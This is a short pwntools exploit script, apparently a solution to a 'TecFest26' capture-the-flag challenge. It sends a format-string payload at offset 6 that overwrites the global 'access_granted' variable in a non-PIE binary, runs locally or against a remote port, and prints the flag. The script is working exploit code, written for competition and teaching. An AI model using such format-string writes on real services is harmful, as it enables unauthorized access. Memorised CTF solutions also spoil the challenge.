#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF("./bin/ei", checksec=False)
context.arch = "amd64"

if args.REMOTE:
    io = remote(args.HOST or "127.0.0.1", int(args.PORT or 40201))
else:
    io = process(["./bin/ei"])

# No-PIE: alamat variabel global statis, cukup dibaca dari binary (nm/objdump/gdb).
target_addr = exe.sym["access_granted"]
log.info(f"access_granted address: {hex(target_addr)}")

OFFSET = 6  # dicek via probing: %6$p mencetak 8 byte pertama input kita

io.recvuntil(b"> ")
payload = fmtstr_payload(OFFSET, {target_addr: 1}, write_size="short")
io.sendline(payload)

flag = io.recvline_contains(b"TecFest26").strip()
print(flag.decode())
io.close()
